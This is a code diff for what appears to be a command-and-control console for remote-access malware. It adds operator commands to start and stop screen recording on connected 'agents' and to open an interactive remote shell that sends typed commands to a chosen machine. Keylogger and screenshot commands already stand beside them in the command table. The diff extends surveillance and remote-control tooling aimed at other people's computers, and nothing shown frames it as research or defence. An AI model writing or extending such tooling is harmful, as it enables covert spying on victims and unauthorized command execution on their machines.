@@ -216,6 +216,124 @@ def terminal(args):
         except (ValueError, IndexError):
             logger.error("Invalid selection.")
 
+    def screen_recording_command():
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
+        
+        try:
+            choice = input("Select agent number (or 'all' for all agents): ").strip()
+            if choice.lower() == 'all':
+                for agent in agents:
+                    agent_tool.send_str(agent, "START_SCREEN_RECORDING")
+                    logger.info(f"Screen recording command sent to {agent.addr}")
+            else:
+                selected_agent = agents[int(choice) - 1]
+                agent_tool.send_str(selected_agent, "START_SCREEN_RECORDING")
+                logger.info(f"Screen recording command sent to {selected_agent.addr}")
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
+
+    def stop_screen_recording_command():
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
+        
+        try:
+            choice = input("Select agent number (or 'all' for all agents): ").strip()
+            if choice.lower() == 'all':
+                for agent in agents:
+                    agent_tool.send_str(agent, "STOP_SCREEN_RECORDING")
+                    logger.info(f"Stop screen recording command sent to {agent.addr}")
+            else:
+                selected_agent = agents[int(choice) - 1]
+                agent_tool.send_str(selected_agent, "STOP_SCREEN_RECORDING")
+                logger.info(f"Stop screen recording command sent to {selected_agent.addr}")
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
+
+    def remote_shell_command():
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
+        
+        try:
+            choice = input("Select agent number: ").strip()
+            selected_agent = agents[int(choice) - 1]
+            
+            # Start remote shell
+            agent_tool.send_str(selected_agent, "START_REMOTE_SHELL")
+            logger.info(f"Remote shell started for {selected_agent.addr}")
+            
+            # Enter interactive shell mode
+            logger.info("Entering interactive shell mode. Type 'exit' to quit.")
+            while True:
+                try:
+                    cmd = input(f"Shell ({selected_agent.addr})> ").strip()
+                    if not cmd:
+                        continue
+                    if cmd.lower() in ['exit', 'quit']:
+                        agent_tool.send_str(selected_agent, "STOP_REMOTE_SHELL")
+                        logger.info("Remote shell session ended.")
+                        break
+                    
+                    # Send command to agent
+                    agent_tool.send_str(selected_agent, cmd)
+                    
+                    # Wait for and display output
+                    # Note: This is a simplified version. In practice, you'd need
+                    # to implement proper output handling in agent_tool
+                    
+                except KeyboardInterrupt:
+                    agent_tool.send_str(selected_agent, "STOP_REMOTE_SHELL")
+                    logger.info("\nRemote shell session interrupted.")
+                    break
+                    
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
+
+    def stop_remote_shell_command():
+        agents = agent_tool.get_agents()
+        if not agents:
+            logger.info("No agents connected.")
+            return
+        
+        # Show available agents
+        logger.info("Available agents:")
+        for i, agent in enumerate(agents, 1):
+            logger.info(f"{i}. {agent.addr}")
+        
+        try:
+            choice = input("Select agent number (or 'all' for all agents): ").strip()
+            if choice.lower() == 'all':
+                for agent in agents:
+                    agent_tool.send_str(agent, "STOP_REMOTE_SHELL")
+                    logger.info(f"Stop remote shell command sent to {agent.addr}")
+            else:
+                selected_agent = agents[int(choice) - 1]
+                agent_tool.send_str(selected_agent, "STOP_REMOTE_SHELL")
+                logger.info(f"Stop remote shell command sent to {selected_agent.addr}")
+        except (ValueError, IndexError):
+            logger.error("Invalid selection.")
+
     def send_custom_command():
         agents = agent_tool.get_agents()
         if not agents:
@@ -247,6 +365,10 @@ def terminal(args):
         "keylogger": keylogger_command,
         "stop_keylogger": stop_keylogger_command,
         "screenshot": screenshot_command,
+        "screen_recording": screen_recording_command,
+        "stop_screen_recording": stop_screen_recording_command,
+        "remote_shell": remote_shell_command,
+        "stop_remote_shell": stop_remote_shell_command,
         "send": send_custom_command,
         "exit": exit_command,
         "back": lambda: logger.info("Returning to main menu..."),
